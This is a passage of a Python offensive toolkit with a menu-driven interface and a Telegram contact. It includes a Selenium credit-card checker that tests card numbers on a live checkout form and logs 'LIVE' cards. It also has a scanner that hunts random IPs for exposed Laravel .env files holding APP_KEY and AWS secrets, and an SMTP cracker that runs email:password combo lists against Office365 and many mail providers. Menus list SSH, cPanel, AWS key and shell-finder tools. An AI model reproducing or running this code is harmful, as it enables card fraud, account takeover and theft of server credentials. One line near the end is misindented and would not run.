        driver.find_element(By.XPATH, '/html/body/div[1]/div/div/main/div/div/div/div/form/div[27]/div/div/div[3]/div/div[2]/button/strong').click()
        time.sleep(1)
        driver.find_element(By.CLASS_NAME, 'btn.btn-primary').click()
        time.sleep(1)
        driver.find_element(By.NAME, 'firstName').send_keys(fn)
        time.sleep(1)

        iframe = WebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '//iframe[contains(@src, "elements-inner-card")]')))
        driver.find_element(By.XPATH, '/html/body/div/form/span[2]/div/div/div[2]/span/input').send_keys(cc)
        driver.switch_to.default_content()

        expiry_iframe = WebDriverWait(driver, 20).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div[1]/div/div/main/div/div/div/div/form/div[27]/div/div/div[3]/div/div[5]/div/div/div[2]/div[1]/div/div/iframe')))
        expiry_input = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/form/span[2]/div/span/input')))
        expiry_input.send_keys(exp)
        driver.switch_to.default_content()

        cvv_iframe = WebDriverWait(driver, 10).until(EC.frame_to_be_available_and_switch_to_it((By.XPATH, '/html/body/div[1]/div/div/main/div/div/div/div/form/div[27]/div/div/div[3]/div/div[5]/div/div/div[2]/div[3]/div/div/iframe')))
        cvv_input = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/form/span[2]/div/span/input')))
        cvv_input.send_keys(cvv)

        driver.switch_to.default_content()
        time.sleep(1)
        driver.find_element(By.NAME, 'lastName').send_keys(ln)
        driver.find_element(By.XPATH, '/html/body/div[1]/div/div/main/div/div/div/div/form/div[29]/div/div/button/span').click()

        time.sleep(15)

        try:
            driver.switch_to.frame(driver.find_element(By.XPATH, '/html/body/div[1]/iframe'))
            print('[{}+{}] {} [{}SMS{}]'.format(fy, fw, carta, fy, fw))
            open('SMS.txt', 'a', errors='ignore').write(carta + '\n')
        except:
            if EC.presence_of_element_located((By.XPATH, '//*[@id="error-container"]'))(driver):
                print('[{}-{}] {} [{}DEAD{}]'.format(fr, fw, carta, fr, fw))
                open('DEAD.txt', 'a', errors='ignore').write(carta + '\n')
            elif 'thank-you' in driver.current_url:
                print('[{}+{}] {} [{}LIVE{}]'.format(fg, fw, carta, fg, fw))
                open('LIVE.txt', 'a', errors='ignore').write(carta + '\n')
        driver.close()
    except:
        print('[{}-{}] {} [{}ERROR{}]'.format(fr, fw, carta, fr, fw))
        open('ERROR.txt', 'a', errors='ignore').write(carta + '\n')
        pass

    return

def run_batch(cc_list):
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(checkercc, cc_list)

def read_cc_file(file_path):
    with open(file_path, 'r') as file:
        cc_list = [line.strip() for line in file]
    return cc_list

def cccheckermain():
    file_path = input("List: ")
    cc_list = read_cc_file(file_path)

    batch_size = 10
    for i in range(0, len(cc_list), batch_size):
        batch = cc_list[i:i + batch_size]
        run_batch(batch)

def d2i_executor(x):
    res = ''
    try:
        res = str(socket.gethostbyname(x))
    except:
        pass
    if res != '':
        print('{}[ {}+{} ] {}{}{} = > [ {}{}{} ]'.format(fw,fg,fw,fg,x,fw,fg,res,fw))
        open('domain_2_ip.txt','a',errors='ignore').write( res + '\n')
    return

def d2i():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(10).map(d2i_executor,lista)
    except:
        pass

# Extra ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    
def chk_env(host):
    list_env = ['.env.bak', '.env', 'env.js','config.env', '.env.dist', '.env.dev', '.env.local', 'public/.env', 'laravel/.env', 'laravel/core/.env', 'beta/.env', 'kyc/.env', 'admin/.env', 'prod/.env', '.env.backup', '.env.docker.dev', '.env.php', '.env.prod', '.env.production.local', '.env.sample.php', '.env.save', '.env.stage', '.env.test', '.env.test.local', '.env.local', '.env.production', '.env.staging', 'backup/.env', 'backup/.env.local', 'backup/.env.production', 'backup/.env.staging', 'public/.env', 'public/.env.local', 'public/.env.production', 'public/.env.staging', 'laravel/.env', 'laravel/.env.local', 'laravel/.env.production', 'laravel/.env.staging', 'laravel/core/.env', 'laravel/core/.env.local', 'laravel/core/.env.production', 'laravel/core/.env.staging', 'beta/.env', 'beta/.env.local', 'beta/.env.production', 'beta/.env.staging',  'live/.env', 'live/.env.local', 'live/.env.production', 'live/.env.staging', 'demo/.env', 'demo/.env.local', 'demo/.env.production', 'demo/.env.staging', 'test/.env', 'test/.env.local', 'test/.env.production', 'test/.env.staging', 'kyc/.env',  'kyc/.env.local', 'kyc/.env.production', 'kyc/.env.staging',  'admin/.env', 'admin/.env.local',  'admin/.env.production',  'admin/.env.staging',  'client/.env', 'client/.env.local', 'client/.env.production', 'client/.env.staging', 'user/.env', 'user/.env.local', 'user/.env.staging', 'api/.env',  'api/.env.local', 'api/.env.staging', 'api/.env.production', 'apis/.env', 'apis/.env.local', 'apis/.env.staging', 'apis/.env.production', 'backend/.env', 'backend/.env.local', 'backend/.env.staging', 'backend/.env.production', 'server/.env', 'server/.env.local', 'server/.env.staging', 'server/.env.production', 'app/.env', 'app/.env.local', 'app/.env.staging', 'app/.env.production', 'project/.env', 'project/.env.local', 'project/.env.staging', 'project/.env.production', 'cron/.env', 'cron/.env.local', 'cron/.env.staging', 'cron/.env.production', 'crm/.env', 'crm/.env.local', 'crm/.env.staging', 'crm/.env.production', 'current/.env', 'current/.env.local', 'current/.env.staging', 'current/.env.production', 'dev/.env', 'dev/.env.local', 'dev/.env.staging', 'dev/.env.production', 'develop/.env', 'develop/.env.local', 'develop/.env.staging', 'develop/.env.production', 'development/.env', 'development/.env.local', 'development/.env.staging', 'development/.env.production', 'prod/.env',  'prod/.env.local', 'prod/.env.staging', 'prod/.env.production', 'product/.env', 'product/.env.local', 'product/.env.staging', 'product/.env.production', 'production/.env', 'production/.env.local', 'production/.env.staging', 'production/.env.production', 'portal/.env', 'portal/.env.local', 'portal/.env.staging', 'portal/.env.production', 'qa/.env', 'qa/.env.local', 'qa/.env.staging', 'qa/.env.production', 'stg/.env', 'stg/.env.local', 'stg/.env.staging', 'stg/.env.production', 'staging/.env', 'staging/.env.local', 'staging/.env.staging', 'staging/.env.production', 'service/.env', 'service/.env.local', 'service/.env.staging', 'service/.env.production', 'services/.env', 'services/.env.local', 'services/.env.staging', 'services/.env.production', 'storage/.env', 'storage/.env.local', 'storage/.env.staging', 'storage/.env.production', 'old/.env', 'old/.env.local', 'old/.env.staging', 'old/.env.production', 'new/.env', 'new/.env.local', 'new/.env.staging', 'new/.env.production', 'web/.env', 'web/.env.local', 'web/.env.staging', 'web/.env.production', 'website/.env', 'website/.env.local', 'website/.env.staging', 'website/.env.production', 'market/.env', 'market/.env.local', 'market/.env.staging', 'market/.env.production', 'marketing/.env', 'marketing/.env.local', 'marketing/.env.staging', 'marketing/.env.production', 'shop/.env', 'shop/.env.local', 'shop/.env.staging', 'shop/.env.production', 'public_html/.env', 'public_html/.env.local', 'public_html/.env.staging', 'public_html/.env.production', 'xampp/.env', 'xampp/.env.local', 'xampp/.env.staging', 'xampp/.env.production','api/.env', '.docker/.env',  '.docker/laravel/app/.env', 'env.backup', '.environment', '.envrc', '.envs', '.env~', '.gitlab-ci/.env', '.vscode/.env', 'mailer/.env', 'twitter/.env', '.env.development.local']
    for path in list_env:
        try:
            url = rebuild_url(host , path)
            resp = requests.get(url,headers=headers,timeout=8,verify=False).text
            if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                resp = requests.get(url.replace('http://','https://'),headers=headers,timeout=8,verify=False,allow_redirects=False).text
                if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                    resp = ''
            if 'APP_KEY' in resp  or 'APP_ENV' in resp or 'AWS_'.lower() in str(resp).lower():
                return True
        except:
            return False
    return False

def chk_debug(host):
    try:
        resp = requests.post(host, data={1: 1}, timeout=10, verify=False).text
        if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
            host = str(host).replace('http://','https://')
            resp = requests.post(host, data={1: 1}, timeout=10, verify=False).text
            if not('APP_KEY' in str(resp) or 'APP_ENV' in resp  or 'aws' in str(resp).lower()):
                resp = ''
        if 'APP_KEY' in resp  or 'APP_ENV' in resp or 'AWS_'.lower() in str(resp).lower():
            return True
    except:
        return False
    return False

def chk_laravel_scanner(host):
    if not str(host).startswith('http'):
        host = 'http://' + str(host)
    if not chk_env(host):
        if not chk_debug(host):
            print(fontstyle.apply('[ {}-{} ] {} [ {}NOT LARAVEL{} ]'.format(fr,fw,host,fr,fw),'bold'))
            return False
    print(fontstyle.apply('[ {}+{} ] {} [ {}LARAVEL{} ]'.format(fg,fw,host,fg,fw),'bold'))
    open('LARAVEL.txt','a',errors='ignore').write(host.replace('http://','') + '\n')

def lar_check():
    lista = list(x.strip() for x in open(input('{}[{}+{}] List : '.format(fw,fg,fw)),'r',errors='ignore').readlines())
    try:
        ThreadPoolExecutor(100).map(chk_laravel_scanner,lista)
    except Exception as e:
        print(e)
        pass

def generateIP():
    blockOne = random.randrange(0, 255, 1)
    blockTwo = random.randrange(0, 255, 1)
    blockThree = random.randrange(0, 255, 1)
    blockFour = random.randrange(0, 255, 1)
    return str(blockOne) + '.' + str(blockTwo) + '.' + str(blockThree) + '.' + str(blockFour)

def gen_lar():
    ALLIPS = []
    not_valid = [0 , 10 , 127 , 169 , 172 , 192]
    max_ips= '10000'
    for i in range(int(max_ips)):
        print('{}[{}GENERATING{}] [ {} / {} ] '.format(fw,fg,fw,i+1,max_ips) ,end='\r')
        ip = generateIP()
        chkkk = False
        for i in not_valid:
            if str(ip).startswith(str(i)):
                chkkk=True
                break
        if not(chkkk):
            ALLIPS.append(ip)
    ALLIPS = [*set(ALLIPS)]
    try:
        with ThreadPoolExecutor(300) as executor:
            executor.map(chk_laravel_scanner, ALLIPS)
    except Exception as e:
        _ = ''
    gen_lar()

def cidr2ip(cidr):
    lista = list(x.strip() for x in open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)),'r',errors='ignore').readlines())
    lista = [*set(lista)]
    for cidr in lista:
        for i in [str(ip) for ip in ipaddress.IPv4Network(str(cidr))]:
            check = list(x.strip() for x in open('range.txt','r',errors='ignore').readlines())
            f = 0
            for a in check :
                if str(a) == str(cidr):
                    f +=1
            if f == 0:
                print(i)
                open('CIDR_range.txt','a',errors='ignore').write(i + '\n')

def ipranger(ip):
    ips_result = []
    ip = str(ip).split('.')
    ip = '{}.{}'.format(ip[0],ip[1])
    for i in range(255):
        for j in range(255):
            new = '{}.{}.{}'.format(ip,str(int(i) + 1),str(int(j) + 1))
            print(new)
            # open('range.txt','a',errors='ignore').write(new + '\n')
            ips_result.append(new)
        print('\n'.join(ips_result), file=open('range.txt','a'))
        ips_result = []

def caller_ipranger():
    os.system('cls')
    logo()
    lista = list(x.strip() for x in open(input('{}[{}!{}]{} List : '.format(flc,fr,flc,fw)),'r',errors='ignore').readlines())
    lista = [*set(lista)]
    try:
        ThreadPoolExecutor(100).map(ipranger,lista)
    except Exception as e:
        print(e)

# def generate_dorks(keywords, PF, DE, PT, SF, selected_formats , num):
#     dorks = []
#     created_dorks = 0
#     for kw in keywords:
#         for pf in PF:
#             for pt in PT:
#                 for de in DE:
#                     for sf in SF:
#                         dork_parts = [
#                             f'{kw}.{pf}?{pt}=',
#                             f'{kw}.{pf}?{pt}=site:{de}',
#                             f'{sf}".{de}"+"{kw}"',
#                             f'{sf}{kw}.{pf}?{pt}=',
#                             f'{sf}{kw}.{pf}?{pt}=site:{de}',
#                             f'{sf}{pt}={kw}.{pf}site:{de}',
#                             f'{sf}"{kw}"+"{de}".{pf}?{pt} =',
#                             f'.{pf}?{pt}="{kw}"',
#                             f'{pt}="{kw}"+".{de}"'
#                         ]

#                         for dork_part in dork_parts:
#                             dork = f'{dork_part}'
#                             dork = str(dork).replace('..','.')
#                             if dork not in dorks:
#                                 open('Generated.txt','a',errors='ignore').write(dork + '\n')
#                                 dorks.append(dork)
#                                 created_dorks += 1
#                             print(f'{fg}[#] Generating Dork {created_dorks}/{total_dorks}{fw}', end='\r', flush=True)
#                             if int(created_dorks) == int(num):
#                                 return

# def dorksgenerator():
#     global total_dorks
#     os.system('cls')
#     logo()
#     frmts = [
#         '1. {kw}.{pf}?{pt}=',
#         '2. {kw}.{pf}?{pt}=site:{de}',
#         '3. {sf}".{de}"+"{kw}"',
#         '4. {sf}{kw}.{pf}?{pt}=',
#         '5. {sf}{kw}.{pf}?{pt}=site:{de}',
#         '6. {sf}{pt}={kw}.{pf}site:{de}',
#         '7. {sf}"{kw}"+"{de}".{pf}?{pt} =',
#         '8. .{pf}?{pt}="{kw}"',
#         '9. {pt}="{kw}"+".{de}"'
#     ]
#     print('{}[{}#{}] {}SUPPORTED FORMATS{}:'.format(fw,fg,fw,fr,fw))
#     print('\n')
#     for i in frmts:
#         print(f'{fg}' + i + f'{fw}')
#     print('\n')
#     lista = list(x.strip() for x in open(input('[{}#{}] Lista keywords : '.format(fg,fw)),'r',errors='ignore').readlines())
#     selected_formats = [True, True, True, True, True, True, True, True, True]
#     total_dorks = len(lista) * len(pageformat) * len(pageformat) * len(domainskeywords) * len(searchfunctions) * len(selected_formats)
#     print('[{}INF{}] {}{}{} DORKS Can be created.'.format(fg,fw,fr,total_dorks,fw))
#     num = input('[{}INF{}] How many dorks you want ? : '.format(fg,fw))
#     generate_dorks(lista, pageformat, domainskeywords, pagetype, searchfunctions, selected_formats , num)

def starter_domain_email(combo):
    HOST_EX = ['','mail.','smtp.']
    PORTS = ['465','587']

    user , pwd = str(combo).split(':',1)
    host = str(user).split('@',1)[1]
    smtps = []
    for hostex in HOST_EX:
        for port in PORTS :
            smtps.append('{}|{}|{}|{}'.format(hostex+host,port,user,pwd))
    for i in smtps:
        if check_smtp_deliver(i):
            break
    return

def starter_office_cracker(combo):
    user , pwd = str(combo).split(':',1)
    hosts = ['smtp.office365.com','smtp-mail.outlook.com','smtp.outlook.com']
    port = '587'
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(check_smtp_deliver, '{}|{}|{}|{}'.format(host, port, user, pwd)) for host in hosts]
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                break
    return

def starter_random_cracker(combo):
    user , pwd = str(combo).split(':',1)
    hosts = ["mail2.mobilis.dz", "mail2.peoplefinders.com", "mail.aaaeasa.com", "mail.accordantmedia.com", "mail.aiforngos.com", "mail.almapatika.hu", "mail.avbusinesssolution.com", "mail.belife4.com", "mail.blackhillsinfosec.com", "mail.blueben.net", "mail.bluemarble.net", "mail.bnmotors.ru", "mail.booyahadvertising.com", "mail.bottleneck.online", "mail.casacatrinei.ro", "mail.chrysostomou.com", "mail.coatpo.es", "mail.cysamex.com.mx", "mail.dmyllc.com", "mail.dsablon.com", "mail.e-eeasy.com", "mail.eaglesmail.net", "mail.egrabber.com", "mail.everyaction.com", "mail.expresstoolpro.com", "mail.fng.ru", "mail.globaltransco.ru", "mail.gosecure.net", "mail.hensongroup.com", "mail.herbamix.net", "mail.icewarp.com", "mail.insidelook.co", "mail.intellitechsoln.com", "mail.internode.on.net", "mail.iomonline.net", "mail.johnsonliftsltd.com", "mail.jump450.com", "mail.keap.com", "mail.klimaxsmusic.be", "mail.kushmoney.com", "mail.kyoto-wu.ac.jp", "mail.librarydistrict1.org", "mail.livefooty.net", "mail.mdhmx.com", "mail.milespartnership.com", "mail.milestoneinternet.com", "mail.msc-salzburg.at", "mail.ndtengineering.net", "mail.newdocks.it", "mail.nkangaladm.gov.za", "mail.orangeeducation.in", "mail.ossisto.com", "mail.plasticmoldingmfg.com", "mail.primariafilipestiidetarg.ro", "mail.prolim.com", "mail.restaurant365.com", "mail.retailss.co.za", "mail.reviewseffect.com", "mail.rh-colegiofaat.com.br", "mail.rvsolutions.in", "mail.sabernex.com", "mail.schild.rs", "mail.seclore.com", "mail.shterngroup.com", "mail.speakup.ge", "mail.ss-associates.com", "mail.systopic.com", "mail.talosintelligence.com", "mail.titanhq.com", "mail.tkreal.ru", "mail.tomoe-corporation.co.jp", "mail.trundl.com", "mail.tutanota.de", "mail.ugvcl.com", "mail.valence.com.br", "mail.valor.ua", "mail.visokogradnja.rs", "mail.wi-fi.org", "mail.woodworks.org", "mail.woopre.com", "mail.zimbra.com", "mail.zimbracloud.com", "mailhost.movistar.es", "smtp-mail.outlook.com", "smtp1.mailfence.com", "smtp1.privaterelay.appleid.com", "smtp.a1.net", "smtp.absamail.co.za", "smtp.amnet.net.au", "smtp.aol.com", "smtp.avanttel.ru", "smtp.basilevs.world", "smtp.bluemailmedia.com", "smtp.blueyonder.co.uk", "smtp.cityonahill.co.za", "smtp.cosmo.ecweb.jp", "smtp.cox.net", "smtp.deoco.co.za", "smtp.eblcom.ch", "smtp.ecosistemas.com.br", "smtp.emailsrvr.com", "smtp.eurothermen.at", "smtp.ewe.net", "smtp.f1soft.com", "smtp.fattummy.co.za", "smtp.fbichefschool.co.za", "smtp.fibertel.com.ar", "smtp.free.fr", "smtp.fwv-us.com", "smtp.gili.at", "smtp.gmail.com", "smtp.gmx.at", "smtp.gmx.com", "smtp.gonulexport.com", "smtp.google.com", "smtp.habitatabq.org", "smtp.hmcc.com.br", "smtp.hsm.co.za", "smtp.hushmail.com", "smtp.hydro.nsc.ru", "smtp.ibbca.com.br", "smtp.iglesia.cl", "smtp.ingelcop.cl", "smtp.ingre.fr", "smtp.itans.com.br", "smtp.justice.gov.za", "smtp.jwmichaels.com", "smtp.kladzdor.ru", "smtp.kolabnow.com", "smtp.lachaudronnerievierzonnaise.fr", "smtp.lantic.net", "smtp.laresidence.fr", "smtp.magnus.kiev.ua", "smtp.mail2tor.com", "smtp.mail.com", "smtp.mail.me.com", "smtp.mail.ru", "smtp.mail.yahoo.co.uk", "smtp.mail.yahoo.com", "smtp.mailbox.org", "smtp.mailgun.com", "smtp.manx.net", "smtp.me.com", "smtp.mg.supportaddresschange.com", "smtp.nsmailtraining.com", "smtp.nycap.rr.com", "smtp.oceamail.com", "smtp.of.pl", "smtp.onlinecheckwriter.com", "smtp.orange.fr", "smtp.outlook.com", "smtp.pansogal.net", "smtp.paubox.com", "smtp.pd-ca.co.jp", "smtp.privatemail.com", "smtp.protonmail.ch", "smtp.qq.com", "smtp.rambler.ru", "smtp.revierspion.de", "smtp.rpost.com", "smtp.runbox.com", "smtp.saskatchewanhealthauthority.ca", "smtp.scherr.com.br", "smtp.scubaversity.co.za", "smtp.secrel.com.br", "smtp.sendgrid.com", "smtp.sk-associates.org", "smtp.smallworldindia.com", "smtp.smarteinc.com", "smtp.smartfitdoors.co.za", "smtp.startmail.com", "smtp.sutherlandkruger.com", "smtp.telsan.com.br", "smtp.thexyzserver.com", "smtp.tools.sky.com", "smtp.tradeindia.com", "smtp.transpedrosa.com.br", "smtp.tucbbs.com.ar", "smtp.unimedsd.com.br", "smtp.veloxmail.com.br", "smtp.worldonline.co.za", "smtp.zailox.serv00.net", "smtp.zerosystems.com", "smtp.zoho.com", "smtpout.secureserver.net"]
    port = '587'
    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(check_smtp_deliver, '{}|{}|{}|{}'.format(host, port, user, pwd)) for host in hosts]
        for future in concurrent.futures.as_completed(futures):
            if future.result():
                break
    return

def SMTPCRACKER():
    os.system('cls')
    logo()
    menu = f"[{fr}#{fw}] {fg}SMTPS CRACKER{fw} [{fr}#{fw}]\n\n"
    menu += f"                                  {fg}[{fr}1{fg}]{fw} Cracker By Domain                                                          \n"
    menu += f"                                  {fg}[{fr}2{fg}]{fw} Cracker [Office365]                                                        \n"
    menu += f"                                  {fg}[{fr}3{fg}]{fw} Cracker Random (ALL POSSIBLE HOSTS)                                                       \n"
    menu += f"\n"
    menu += f"{fg}[{fr}0{fg}]{fw} Back To Menu          \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    print('\n')
    choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')
    match int(choice):
        case 1:
            lista = list(x.strip() for x in open(input('[{}#{}] Lista : '.format(fg,fw)),'r',errors='ignore').readlines())
            try:
                ThreadPoolExecutor(100).map(starter_domain_email , lista)
            except Exception as e:
                print(e)
        case 2:
            lista = list(x.strip() for x in open(input('[{}#{}] Lista : '.format(fg,fw)),'r',errors='ignore').readlines())
            try:
                ThreadPoolExecutor(100).map(starter_office_cracker , lista)
            except Exception as e:
                print(e)
        case 3:
            lista = list(x.strip() for x in open(input('[{}#{}] Lista : '.format(fg,fw)),'r',errors='ignore').readlines())
            try:
                ThreadPoolExecutor(100).map(starter_random_cracker , lista)
            except Exception as e:
                print(e)
        case 0:
            mainmenu()
        case _:
            print('[{}INF{}] Wrong Choice [Back to menu]'.format(fr,fw))
            time.sleep(1)
            SMTPCRACKER()

# MAIN +++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def sitesgrabbermenu():
    os.system('cls')
    logo()
    menu = f"[{fr}#{fw}] {fg}SITES GRABBER{fw} [{fr}#{fw}]\n\n"
    menu += f"{fg}[{fr}1{fg}]{fw} Zone-H              \n"
    menu += f"{fg}[{fr}2{fg}]{fw} Zone-Xsec           \n"
    menu += f"{fg}[{fr}3{fg}]{fw} Haxor               \n"
    menu += f"{fg}[{fr}4{fg}]{fw} Hypestat            \n"
    menu += f"{fg}[{fr}5{fg}]{fw} CubDomain           \n"
    menu += f"{fg}[{fr}6{fg}]{fw} Bitverzo            \n"
    menu += f"{fg}[{fr}7{fg}]{fw} CertStream          \n"
    menu += f"{fg}[{fr}8{fg}]{fw} Grabber by TLD      \n"
    menu += f"\n\n"
    menu += f"{fg}[{fr}0{fg}]{fw} Back To Menu        \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')
    match int(choice) :
        case 1:
            zoneh()
        case 2:
            zone_xsec()
        case 3:
            haxor()
        case 4:
            Hypestat()
        case 5:
            cubdomainmain()
        case 6:
            bitverzo()
        case 7:
            certstream_main()
        case 8:
            tldgrabber()
        case 0:
            mainmenu()
        case _:
            print('[{}INF{}] Wrong Choice [Back to menu]'.format(fr,fw))
            time.sleep(1)
            sitesgrabbermenu()

def ipsgrabber():
    os.system('cls')
    logo()
    menu = f"[{fr}#{fw}] {fg}IPS GRABBER{fw} [{fr}#{fw}]\n\n"
    menu += f"{fg}[{fr}1{fg}]{fw} Leakix              \n"
    menu += f"{fg}[{fr}2{fg}]{fw} Shodan              \n"
    menu += f"{fg}[{fr}3{fg}]{fw} Fofa                \n"
    menu += f"\n\n"
    menu += f"{fg}[{fr}0{fg}]{fw} Back To Menu        \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    print('\n')
    choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')
    match int(choice):
        case 1 :
            leakix_main()
        case 2:
            shodan_main()
        case 3:
            fofa_main()
        case 0:
            mainmenu()
        case _:
            print('[{}INF{}] Wrong Choice [Back to menu]'.format(fr,fw))
            time.sleep(1)
            ipsgrabber()

def checkersmenu():
    os.system('cls')
    logo()
    menu = f"[{fr}#{fw}] {fg}CHECKERS{fw} [{fr}#{fw}]\n\n"
    menu += f"{fg}[{fr}1{fg}]{fw} SSH Checker           \n"
    menu += f"{fg}[{fr}2{fg}]{fw} WHM Checker           \n"
    menu += f"{fg}[{fr}3{fg}]{fw} Cpanel Checker        \n"
    menu += f"{fg}[{fr}4{fg}]{fw} Cpanel Checker        \n"
    menu += f"{fg}[{fr}5{fg}]{fw} AWS KEY Checker       \n"
    menu += f"                                  {fg}[{fr}6{fg}]{fw} Live IP Checker ( Port : {fg}80{fw} / {fg}443{fw} )\n"
    menu += f"                        {fg}[{fr}7{fg}]{fw} Bulk Mailers Tester ( {fg}Leafmailer{fw} ) \n"
    menu += f"{fg}[{fr}8{fg}]{fw} Bulk SMTPs Tester     \n"
    menu += f"{fg}[{fr}9{fg}]{fw} CC checker            \n"
    menu += f"                 {fg}[{fr}10{fg}]{fw} Bounce checker ({fg}Office365{fw})  \n"
    menu += f"\n\n"
    menu += f"{fg}[{fr}0{fg}]{fw} Back To Menu          \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    print('\n')
    choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')
    match int(choice):
        case 1:
            check_ssh()
        case 2:
            whm()
        case 3:
            cpanel()
        case 4:
            webmail()
        case 5:
            aws_checker_main()
        case 6:
            call_chk80_443()
        case 7:
            MT()
        case 8:
            SMTPTESTER()
        case 9:
            cccheckermain()
        case 10:
            bouncemain()
        case 0:
            mainmenu()
        case _:
            print('[{}INF{}] Wrong Choice [Back to menu]'.format(fr,fw))
            time.sleep(1)
            checkersmenu()

def contactinfo():
    import webbrowser
    url = "https://t.me/Nyx_FallagaTn"
    webbrowser.open(url, new=0, autoraise=True)

def Extramenu():
    os.system('cls')
    logo()
    menu = f"[{fr}#{fw}] {fg}CHECKERS{fw} [{fr}#{fw}]\n\n"
    menu += f"                                     {fg}[{fr}1{fg}]{fw} Laravel Checker                                                          \n"
    menu += f"                                     {fg}[{fr}2{fg}]{fw} Domain to IP                                                             \n"
    menu += f"                                     {fg}[{fr}3{fg}]{fw} CIDR ranger                                                              \n"
    menu += f"                                     {fg}[{fr}4{fg}]{fw} Dorks Generator [{fr}DOWN{fw}]                                           \n"
    menu += f"                                     {fg}[{fr}5{fg}]{fw} Unlimited Random IPS Generator + laravel check                           \n"
    menu += f"                                     {fg}[{fr}6{fg}]{fw} IP ranger ( Example : {fr}192.168.1.1{fw} - {fr}192.168.255.255 {fw})\n"
    menu += f"\n\n"
    menu += f"{fg}[{fr}0{fg}]{fw} Back To Menu          \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    print('\n')
    choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')

    match int(choice):
        case 1:
            lar_check()
        case 2:
            d2i()
        case 3:
            cidr2ip()
        case 4:
            # dorksgenerator()
            Extramenu()
        case 5:
            gen_lar()
        case 6:
            caller_ipranger()
        case 0:
            mainmenu()
        case _:
            print('[{}INF{}] Wrong Choice [Back to menu]'.format(fr,fw))
            time.sleep(1)
            Extramenu()

def mainmenu():
    os.system('cls')
    logo()
    print('[{}#{}]========[{}#{}] VERSION {}5.0{} [{}#{}]========[{}#{}]         '.center(os.get_terminal_size().columns , " ").format(fr,fw,fr,fw,fg,fw,fr,fw,fr,fw))
    print('\n')
    menu =  f"{fg}[{fr}1{fg}]{fw} Sites Grabber          \n"
    menu += f"{fg}[{fr}2{fg}]{fw} Ips Grabber            \n"
    menu += f"{fg}[{fr}3{fg}]{fw} Reverser               \n"
    menu += f"{fg}[{fr}4{fg}]{fw} Laravel Scanner        \n"
    menu += f"{fg}[{fr}5{fg}]{fw} Shells Finder V4       \n"
    menu += f"{fg}[{fr}6{fg}]{fw} SMTPS Cracker          \n"
    menu += f"{fg}[{fr}7{fg}]{fw} Checkers               \n"
    menu += f"{fg}[{fr}8{fg}]{fw} Extra                  \n"
    menu += f"{fg}[{fr}0{fg}]{fw} Contact & Exit         \n"
    for line in menu.split('\n'):
        print(line.center(os.get_terminal_size().columns , " "))

    print('\n')
    raw_choice = input(f'{fr}[{fg}SELECT{fr}]{fw} ➧ ')
    choice = re.sub(r'\D', '', raw_choice)  # Hapus semua non-digit
     if not choice:
    choice = '0'
    match int(choice):
        case 1:
            sitesgrabbermenu()
        case 2:
            ipsgrabber()
        case 3:
            webscan()
        case 4:
            laravel_main()
        case 5:
            ShellFinderv2()
        case 6:
            SMTPCRACKER()
        case 7:
            checkersmenu()
        case 8:
            Extramenu()
        case 0:
            os.system('cls')
            logo()
            print("Thank you for using my script!                            ".center(os.get_terminal_size().columns ,' '))
            print("If you encounter any issues,                            ".center(os.get_terminal_size().columns ,' '))
            print("I've opened my account in your browser.                            ".center(os.get_terminal_size().columns ,' '))
            print("Feel free to reach out, and I'll promptly fix it.                            ".center(os.get_terminal_size().columns ,' '))
            print('\n\n')
            msg = "Redirecting to my Account"
            for i in range(3):
                msg += '.'
                print(msg , end='\r')
                time.sleep(1)
            contactinfo()

if __name__ == '__main__':

    mainmenu()


